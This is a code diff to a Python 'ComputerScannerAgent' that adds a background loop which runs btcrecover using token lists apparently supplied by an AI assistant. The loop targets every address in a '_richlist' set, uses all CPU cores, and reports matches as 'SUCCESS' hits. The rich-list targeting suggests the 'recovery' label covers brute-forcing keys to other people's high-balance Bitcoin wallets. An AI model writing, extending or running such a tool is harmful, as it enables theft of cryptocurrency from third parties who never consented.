@@ -228,6 +228,11 @@ class ComputerScannerAgent:
                     added_count += 1
             print(f"[ComputerScanner] Ingested {added_count} new recovery tokens from assistant")
 
+        # If a scan is already running, we trigger a targeted recovery scan
+        # with the new intelligence.
+        if self.is_running and (tokens or addresses):
+            print("[ComputerScanner] Intelligence update received during active scan - triggering recovery loop")
+            self._recovery_event.set()
         # Trigger an immediate recovery scan pass with the new intelligence
         if self.is_running and (tokens or addresses or deep_scan is not None):
             print(f"[ComputerScanner] [DeepTools Engine] Intelligence update received (Deep: {self.deep_scan}). Triggering recovery pass.")
@@ -373,6 +378,47 @@ class ComputerScannerAgent:
                         timestamp=datetime.now(timezone.utc)
                     ))
         except Exception: pass
+
+    def _recovery_loop(self):
+        """Background loop that waits for recovery events and runs btcrecover"""
+        while self.is_running:
+            # Wait for event or timeout (every 1 hour if idle)
+            triggered = self._recovery_event.wait(timeout=3600)
+            if not self.is_running: break
+
+            if triggered or self.btc_recover_tokens:
+                self._recovery_event.clear()
+
+                with self._recovery_lock:
+                    if not self.btc_recover_tokens or not self._richlist:
+                        continue
+
+                    print(f"[ComputerScanner] Triggering recovery scan with {len(self.btc_recover_tokens)} tokens against {len(self._richlist)} targets")
+
+                    results = run_btcrecover_scan(
+                        tokenlist=self.btc_recover_tokens,
+                        target_addresses=list(self._richlist),
+                        exhaustive=self.deep_scan,
+                        workers=os.cpu_count() or 4
+                    )
+
+                    self.stats["recovery_attempts"] += results.get("attempts", 0)
+
+                    if results.get("found"):
+                        for match in results.get("matches", []):
+                            self.stats["recovery_matches"] += 1
+                            self._hit_queue.put(ScanHit(
+                                artifact_type="Recovery Match",
+                                path="N/A (AI Assistant Intelligence)",
+                                addresses={match.get("coin", "btc").lower(): match["address"]},
+                                balances={},
+                                metadata=match,
+                                timestamp=datetime.now(timezone.utc)
+                            ))
+                            print(f"[ComputerScanner] SUCCESS: Found match for address {match['address']}")
+
+            # Sleep a bit to avoid tight loop if event is constantly set
+            time.sleep(5)
 
     def hits(self) -> Iterator[ScanHit]:
         while self.is_running or not self._hit_queue.empty():
